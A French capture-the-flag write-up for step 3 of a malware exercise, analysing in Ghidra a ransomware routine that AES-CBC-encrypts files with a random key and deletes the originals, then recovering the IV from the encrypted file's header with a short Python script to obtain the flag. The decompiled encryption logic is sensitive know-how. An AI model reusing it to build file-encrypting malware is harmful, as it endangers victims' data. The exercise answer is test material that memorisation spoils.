Exercice : Step 3/4 malware

Mot de passe à trouve : "81 FC 95 DF 61 7C 27 6F 2C 05 7F D6 3B 0F 63 82"

Méthode de résolution : 

## Recherche de la fonction de chiffrement  dans ghidra

Reprenons la fonction `encrypt_file` que nous avons trouvé dans l'étape 2/4, et analysons son code pour trouver la fonction de chiffrement utilisée pour chiffrer les données du système.

```C
   iVar1 = setChmod(param_1,6);
  if ((iVar1 != -1) && (iVar1 = is_symlink(param_1), iVar1 == 0)) {
    stat(param_1,&local_108);
    local_3c[0] = local_108.st_mode;
    __stream = fopen64(param_1,"rb");
    __stream_00 = fopen64(param_2,"wb");
    if (__stream_00 == (FILE *)0x0) {
      __stream_00 = __stream;
      if (__stream == (FILE *)0x0) {
        return;
      }
    }
    else if (__stream != (FILE *)0x0) {
      __ptr = (void *)randstring(0x10);
      __ptr_00 = malloc(0x800);
      puVar5 = local_58;
      puVar6 = __ptr_00;
      for (lVar3 = 0x200; lVar3 != 0; lVar3 = lVar3 + -1) {
        *puVar6 = 0;
        puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
      }
      do {
        iVar1 = rand();
        *puVar5 = (char)iVar1;
        puVar5 = puVar5 + 1;
      } while (puVar5 != local_48);
      local_49 = local_49 & 0xf0 | (byte)(int)local_108.st_size & 0xf;
      local_40 = public_encrypt(__ptr,0x10,__ptr_00);
      if (local_40 == -1) {
        fclose(__stream);
        fclose(__stream_00);
        param_1 = param_2;
      }
      else {
        fwrite(local_3c,1,4,__stream_00);
        fwrite(&local_40,1,4,__stream_00);
        fwrite(__ptr_00,1,(long)local_40,__stream_00);
        fwrite(local_58,1,0x10,__stream_00);
        for (iVar1 = 0; iVar1 < (int)local_108.st_size; iVar1 = iVar1 + 0x10) {
          iVar4 = (int)local_108.st_size - iVar1;
          if (0x10 < iVar4) {
            iVar4 = 0x10;
          }
          sVar2 = fread_unlocked(local_68,1,(long)iVar4,__stream);
          if ((int)sVar2 < 1) break;
          aes_encrypt(local_68,0x10,__ptr,local_58,local_78);
          fwrite(local_78,1,0x10,__stream_00);
        }
        fclose(__stream);
        fclose(__stream_00);
        free(__ptr);
        free(__ptr_00);
      }
      unlink(param_1);
      return;
    }
    fclose(__stream_00);
  }
  return;
```

Information recueillies à partir de la fonction `encrypt_file` :

- __stream : c'est un pointeur vers un fichier qui est utilisé pour lire les données du système à chiffrer.
- __stream_00 : c'est un pointeur vers un fichier qui est utilisé pour écrire les données chiffrées.
- __ptr : c'est un pointeur vers une chaîne de caractères utilisée comme clé de chiffrement générée aléatoirement.
- __ptr_00 : c'est un pointeur vers une zone de mémoire utilisée pour stocker la clé de chiffrement.
- local_40 : c'est une variable qui stocke la taille de la clé de chiffrement utilisée pour chiffrer les données du système.
- local_58 : c'est un tableau de 16 octets qui stocke la clé de chiffrement utilisée pour chiffrer les données du système, qui represente le IV pour AES_128_CBC.

## Trouver le vecteur d'initialisation (IV) et la clé de chiffrement utilisée pour chiffrer les données du système

Si l'on se penche sur cet extrait de code:

```C
fwrite(local_3c,1,4,__stream_00);
        fwrite(&local_40,1,4,__stream_00);
        fwrite(__ptr_00,1,(long)local_40,__stream_00);
        fwrite(local_58,1,0x10,__stream_00);
```
On peut voir ou l'attaquant les informations sur le vecteur d'initialisation et la clé de chiffrement.

Si on arrive à se déplacer dans le fichier chiffré à l'offset 8 + taille_cle_chiffrement, on peut trouver le vecteur d'initialisation utilisé pour chiffrer les données du système, et si on se déplace à l'offset 8, on peut trouver la clé de chiffrement utilisée pour chiffrer les données du système.

### Script pour trouver le IV 

```python
with open("flag.encrypted", "rb") as f:
    f.seek(4)
    taille_cle = int.from_bytes(f.read(4), "little")

    
    f.seek(8 + taille_cle)

    
    iv = f.read(16)

print(" ".join(f"{b:02X}" for b in iv))
```
Ainsi, en exécutant ce script, on trouve que le vecteur d'initialisation utilisé pour chiffrer les données du système est : "81 FC 95 DF 61 7C 27 6F 2C 05 7F D6 3B 0F 63 82", qui correspond au mot de passe demandé dans l'exercice.